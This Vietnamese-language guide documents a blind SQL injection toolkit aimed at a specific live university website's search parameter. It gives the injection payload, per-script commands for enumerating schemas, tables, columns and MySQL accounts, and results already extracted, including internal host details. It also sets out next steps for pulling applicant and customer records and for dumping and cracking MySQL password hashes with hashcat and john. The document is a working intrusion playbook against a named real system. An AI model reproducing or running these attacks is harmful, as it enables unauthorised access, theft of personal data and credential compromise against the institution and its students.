# Hướng dẫn sử dụng bộ tool Blind SQLi — uef.edu.vn (txtSearch)

> Bối cảnh: blind SQLi boolean-based trên tham số `txtSearch` của
> `https://www.uef.edu.vn/thu-vien-hinh-anh?Trang_1&txtSearch=<payload>`
> Payload lõi: `the0"XOR(if(<BIỂU_THỨC>,1,0))XOR"Z`
> - TRUE  → trang render thêm dữ liệu  → ~82 KB
> - FALSE → trang trả về mặc định      → 71.052 bytes
> - Ngưỡng phân loại: `THRESH = 75000` bytes (size >= ngưỡng ⇒ TRUE)

Đã xác nhận trước đó (xem `sqli_evidence_uef.txt`): time-based sleep hoạt động
(delay ≈ 2× giá trị sleep ⇒ truy vấn chạy 2 lần/request), boolean oracle điều
khiển được delay, không có WAF chặn, HTTP 200 ổn định. MySQL **5.6.21**
(Community Server, EOL từ 02/2021).

---

## 1. Cơ chế dùng chung (mọi script đều như nhau)

Mỗi script chỉ dùng thư viện chuẩn Python 3 (không cần pip install gì).

Hàm trích xuất theo kiểu nhị phân (binary search):

| Hàm | Chức năng | Số request |
|---|---|---|
| `get_len(expr)` | đo `CHAR_LENGTH` bằng `CHAR_LENGTH((expr))>mid` | ~7 |
| `get_char(expr,pos)` | đo từng ký tự bằng `ASCII(SUBSTRING((expr),pos,1))>mid` | ~7/ký tự |
| `extract(expr,label)` | độ dài → lấy ký tự song song (ThreadPool) | tổng ~7×(len+1) |
| `num(expr)` | đếm số dòng bằng `(expr)>mid` | ~7 |

Cuối mỗi chuỗi, script **verify lại** bằng `BINARY (expr)='<giá trị>'`:
- log `verify=True` ⇒ kết quả tin cậy.
- `VERIFY_FAILED` ⇒ đo sai do nhiễu ⇒ chạy lại mục đó.

Lưu ý quan trọng:
- Kết quả ghi ra JSON **sau mỗi mục** → ngắt giữa chừng không mất dữ liệu đã có.
- Log dùng chung: `/tmp/sqli_enum_uef.log` (đi kèm timestamp + số request).
- Script ghi output vào **đường dẫn tuyệt đối trong `/tmp/`** bất kể chạy từ đâu.
  Thư mục `/home/kali/Baocao/tmp` hiện là bản sao lưu file; muốn đổi nơi ghi thì
  sửa hằng `LOG`, `JSONF`, `OUT` ở đầu script.
- 12 lần FALSE liên tiếp → script tự health-check bằng `1=1`; nếu oracle hỏng
  sẽ thoát với mã lỗi 2 (`FATAL oracle broken`).
- `maxlen` mặc định: 96 (enum2) / 64 (các file khác). Nếu dữ liệu dài hơn cần
  nâng tham số `maxlen` của `extract()`/`get_len()`.

---

## 2. `sqli_enum2_uef.py` — enumerator chính (content oracle)

```bash
python3 /home/kali/Baocao/tmp/sqli_enum2_uef.py <stage>
```

Stage: `info | schemas | tables | columns | users`

| Stage | Làm gì | Ghi vào |
|---|---|---|
| `info` | `database()`, `user()`, `current_user()`, `@@version`, `@@version_comment`, `@@hostname` | `sqli_enum_uef.json` → khoá `info` |
| `schemas` | đếm + tên schema (tối đa 20) | khoá `schemas` |
| `tables` | đếm bảng trong DB hiện tại, lấy tên theo alphabet (tối đa 40) | khoá `tables` (ghi đè, chạy từ 0) |
| `columns` | chọn tối đa 3 bảng (ưu tiên tên khớp `user|admin|account|member|...`), lấy tên cột | khoá `columns` |
| `users` | đếm + liệt kê `mysql.user` (user + host, tối đa 8) | khoá `users` |

Chạy 5 stage theo thứ tự trên là có toàn bộ khung dữ liệu. Ví dụ:

```bash
python3 /home/kali/Baocao/tmp/sqli_enum2_uef.py info
python3 /home/kali/Baocao/tmp/sqli_enum2_uef.py schemas
python3 /home/kali/Baocao/tmp/sqli_enum2_uef.py tables
python3 /home/kali/Baocao/tmp/sqli_enum2_uef.py columns
python3 /home/kali/Baocao/tmp/sqli_enum2_uef.py users
```

## 3. `sqli_enum3_uef.py` — lấy tiếp tên bảng (nối dài)

Dùng khi danh sách bảng nhiều hơn 40 (hiện trạng: DB `uefweb` có **142** bảng,
enum2 chỉ lấy tối đa 40). Script này lấy **phần đuôi** tên bảng (bỏ tiền tố
`tbl_`, lấy `SUBSTRING(table_name,5)`) rồi tự nối lại `tbl_` khi lưu, và
**append** vào danh sách `tables` có sẵn trong JSON.

```bash
python3 /home/kali/Baocao/tmp/sqli_enum3_uef.py <start> <end> [workers]
```

- `<start>`: chỉ số LIMIT bắt đầu (0-based, trùng OFFSET trong `LIMIT n,1`).
- `<end>`: chỉ số kết thúc (không lấy end).
- `[workers]`: số luồng song song, mặc định 4; log cho thấy 6–10 chạy ổn.

Ví dụ — lấy tiếp bảng 31 → 60 (JSON đang có 31 tên, index 0..30):

```bash
python3 /home/kali/Baocao/tmp/sqli_enum3_uef.py 31 61 6
# lượt tiếp theo:
python3 /home/kali/Baocao/tmp/sqli_enum3_uef.py 61 91 6
python3 /home/kali/Baocao/tmp/sqli_enum3_uef.py 91 121 6
python3 /home/kali/Baocao/tmp/sqli_enum3_uef.py 121 142 6
```

Tốc độ tham khảo (từ log thực tế): tên 20–25 ký tự ≈ 25–45 giây/bảng với
workers 6–10, ~120–180 request/bảng.

## 4. `sqli_users_uef.py` — tài khoản MySQL (mysql.user)

```bash
python3 /home/kali/Baocao/tmp/sqli_users_uef.py
```

- Tự kiểm tra `mysql.user` có đọc được không (ask `COUNT(*)>=0`); nếu không
  được thì kết thúc ngay sau vài request.
- Nếu được: đếm số dòng, lấy tối đa **10** dòng theo `ORDER BY user,host`,
  mỗi dòng lấy `user` + `host`.
- Output: `/tmp/sqli_users_uef.json` (khoá `accounts`, `n_accounts`).

Kết quả đã có: `(""@localhost, pma@localhost)`; `root@127.0.0.1` xác nhận qua
script finish (xem mục 5).

## 5. Các file bổ trợ cùng bộ

### `sqli_enum_uef.py` — bản gốc dùng time oracle (sleep)
```bash
python3 /home/kali/Baocao/tmp/sqli_enum_uef.py calib    # hiệu chỉnh ngưỡng thời gian, chạy đầu tiên
python3 /home/kali/Baocao/tmp/sqli_enum_uef.py <stage>  # info|schemas|tables|columns|users
```
Dùng khi content oracle (so sánh kích thước trang) không ổn định; chậm hơn vì
mỗi câu hỏi phải chờ sleep.

### `sqli_mysqldb_uef.py` — bảng grant `mysql.db`
```bash
python3 /home/kali/Baocao/tmp/sqli_mysqldb_uef.py
```
Kiểm tra quyền đọc `mysql.db`, `mysql.user`, `mysql.tables_priv`, rồi liệt kê
tối đa 30 dòng grant (user@host → db). Output: `/tmp/sqli_mysqldb_uef.json`.

### `sqli_finish_uef.py` — 2 chế độ
```bash
# tiếp tục mysql.user từ hàng <start> (mặc định 2) → /tmp/sqli_users2_uef.json
python3 /home/kali/Baocao/tmp/sqli_finish_uef.py users 3

# tên cột của 1..n bảng chỉ định → /tmp/sqli_columns_uef.json
python3 /home/kali/Baocao/tmp/sqli_finish_uef.py columns tbl_dangkyxettuyendaihoc tbl_danhsachxettuyennv
```
Chế độ `columns` lấy tối đa 30 cột/bảng, mỗi cột verify trước khi lưu.

---

## 6. Kết quả đã thu được (lấy từ JSON hiện có)

- **DB / DB user / phiên bản**: `uefweb` / `uefweb@172.16.6.84` / MySQL `5.6.21`
  Community Server (GPL), hostname `UEF-WEBDB-2`.
- **8 schema**: `cdcol, information_schema, mysql, performance_schema,
  phpmyadmin, test, uefweb, webauth`.
- **142 bảng** trong `uefweb`; đã lấy 31 tên (từ `tbl_album` đến
  `tbl_khaothi_tracuunhdt` — xem `sqli_enum_uef.json`).
- **mysql.user**: 8 dòng. Đã xác nhận: `""@localhost`, `pma@localhost`,
  `root@127.0.0.1` (còn 5 dòng chưa lấy — `sqli_users2_uef.json` mới có idx 2).
- **mysql.db**: 3 dòng — `("", %, test)`, `("", %, test\_%)`,
  `(pma, localhost, phpmyadmin)`.

## 7. Việc tiếp theo theo thiết kế của bộ tool

1. Lấy nốt tên bảng 31→142: chạy `sqli_enum3_uef.py` theo các khoảng ở mục 3.
2. Xem cột các bảng nhạy cảm (đăng ký tư vấn tuyển sinh, danh sách xét tuyển…):
   `sqli_finish_uef.py columns <bảng>` hoặc stage `columns` của enum2.
3. Hoàn thiện `mysql.user` (dòng 3→7): `sqli_finish_uef.py users 3`.
4. Khi đã có bảng + cột → viết script extract dữ liệu theo đúng khuôn mẫu
   `if(...)` + `SUBSTRING`/`ASCII` như trên (có thể copy phần lõi của enum3 và
   đổi câu SELECT).

## 8. Lưu ý vận hành

- Mỗi ký tự tốn ~7 request ⇒ với bảng/dữ liệu lớn, hãy giới hạn số dòng lấy ra
  (`LIMIT`) và tăng `workers` vừa phải (6–10). Đừng tăng vô tội vạ — đây là
  request thẳng tới website thật.
- `VERIFY_FAILED` = kết quả đo không khớp bước verify ⇒ chỉ cần chạy lại mục đó,
  không cần chạy lại toàn bộ stage.
- Kết quả JSON là "bất biến cộng dồn": enum3 append vào `tables`, enum2 ghi đè
  khoá riêng của stage khi chạy lại. Muốn giữ snapshot thì copy JSON trước khi
  chạy lại stage `tables` của enum2.
- Script tôn trọng retry: mỗi câu hỏi thử tối đa 3 lần, lỗi mạng coi như FALSE
  nhưng không cache — lần hỏi sau sẽ thử lại.


## 9. Tool mở rộng `sqli_ext_uef.py` (đa chế độ)

Các tool cũ chỉ liệt kê được bảng của DB hiện tại (`database()`), cột của tối đa
3 bảng và không lấy được nội dung dữ liệu. Tool này bổ sung. Cú pháp chung:

```bash
python3 /tmp/sqli_ext_uef.py <mode> [tham số]
```

| Mode | Cú pháp | Tác dụng |
|---|---|---|
| `tables` | `tables <schema> [start] [end] [workers]` | Liệt kê bảng của 1 schema bất kỳ (append, resume được) |
| `columns` | `columns <table> [max_cols] [workers]` | Cột của 1 bảng (schema hiện tại; `db.table` nếu schema khác) |
| `colscan` | `colscan [regex] [workers] [max_cols]` | Cột của **tất cả** bảng có trong `/tmp/sqli_enum_uef.json`, lọc theo regex, tự bỏ qua bảng đã làm (resume) |
| `count` | `count <table>` | Số dòng của bảng |
| `rows` | `rows <table> [n] [start] [workers] [maxlen]` | Lấy n dòng đầu (cả dòng gộp bằng `CONCAT_WS('\|',...)`) |
| `cell` | `cell <table> <cot> <offset> [workers] [maxlen]` | Lấy 1 ô dữ liệu đầy đủ (cột x, dòng y) |
| `hashes` | `hashes [workers]` | Password hash của `mysql.user` (user, host, password) |
| `sql` | `sql "<SELECT...>" [maxlen] [workers]` | 1 giá trị tùy ý — dùng cho mọi câu hỏi lẻ |

Output: `/tmp/sqli_ext_uef.json`. Log: `/tmp/sqli_enum_uef.log` (chung).

### 9.1. Bảng của cả 8 schema

```bash
cd /tmp
for s in cdcol information_schema mysql performance_schema phpmyadmin test uefweb webauth; do
  python3 sqli_ext_uef.py tables "$s" 0 80 6
done
```

- Schema hệ thống (`information_schema`, `performance_schema`, `mysql`) chủ yếu
  để hiểu cấu trúc; đáng chú ý khai thác nhất là `uefweb` (142 bảng) và
  `webauth` (tên gợi ý DB xác thực).
- Riêng `uefweb`: nếu danh sách 61 tên cũ còn nguyên thì chạy
  `tables uefweb 61 142 6`; nếu đang chạy lại từ đầu (`0 142`) thì đợi xong rồi
  cắt bỏ 61 phần tử đầu của `tables[uefweb]` (lệnh ở mục 9.5).

### 9.2. Cột của toàn bộ bảng

```bash
# Ưu tiên: chỉ quét bảng nhạy cảm (nhanh hơn nhiều)
python3 sqli_ext_uef.py colscan 'register|xettuyen|consultant|customer|user|admin|group|permission|log|account|gopy|news|vote' 6

# Hoặc quét TẤT CẢ bảng trong danh sách (chạy nền, hàng giờ)
nohup python3 sqli_ext_uef.py colscan '' 6 > /tmp/colscan.log 2>&1 &
```

`colscan` đọc danh sách bảng từ `/tmp/sqli_enum_uef.json` (bỏ trùng lặp), quét
từng bảng, lưu vào `columns[<tên_bảng>]` và **tự nhảy qua** bảng đã có cột khi
chạy lại → an toàn khi ngắt.

### 9.3. Nội dung dữ liệu

```bash
# Đếm dòng từng bảng quan trọng trước để chọn ưu tiên:
python3 sqli_ext_uef.py count tbl_customerinfo
python3 sqli_ext_uef.py count tbl_dangkyxettuyendaihoc

# Lấy 5 dòng đầu của 1 bảng (mỗi dòng 1 chuỗi gộp, phân tách '|', NULL = ~NULL~):
python3 sqli_ext_uef.py rows tbl_group 5 0 6 192

# Lấy nguyên vẹn 1 ô: bảng <t>, cột <c>, dòng thứ <offset> (0-based):
python3 sqli_ext_uef.py cell tbl_customerinfo full_name 0 6 256

# Câu hỏi SQL tùy ý (nhớ ngoac kep):
python3 sqli_ext_uef.py sql "SELECT @@secure_file_priv"
python3 sqli_ext_uef.py sql "SELECT COUNT(*) FROM mysql.tables_priv" 
```

Thực tế vận tốc: ~5–7 request/giây với workers=6; 1 ký tự ≈ 7 request. Một dòng
gộp 100 ký tự ≈ 2–4 phút. **Đừng dump nguyên bảng** — lấy 3–5 dòng mẫu để hiểu
cấu trúc, rồi dùng `cell` lấy đúng ô giá trị.

### 9.4. Hash mật khẩu MySQL

```bash
python3 sqli_ext_uef.py hashes 6
# Hash dạng *<SHA1(SHA1(matkhau))> 41 ký tự — lưu trong mysql_hashes của JSON.
# V cracking offline:
#   hashcat -m 200 hash.txt /usr/share/wordlists/rockyou.txt
#   john --format=mysql-sha1 hash.txt
```

### 9.5. Xử lý sự cố dữ liệu bảng

- **Bỏ 61 phần tử đầu của danh sách bảng uefweb** (khi đã chạy xong lượt `0 142`):

```bash
python3 - <<'EOF'
import json
p='/tmp/sqli_enum_uef.json'
d=json.load(open(p)); d['tables']=d['tables'][61:]
json.dump(d,open(p,'w'),indent=1,ensure_ascii=False)
print('con lai',len(d['tables']),'bang')
EOF
```

- **Quy tắc chung**: chỉ chạy MỘT script SQLi tại một thời điểm (các script cùng
  ghi chung JSON/log và cùng gửi request tới server); `VERIFY_FAILED` → chạy lại
  đúng mục đó; số phần tử danh sách bảng chỉ đúng khi các khoảng [start,end)
  nối tiếp nhau không chồng lấn.
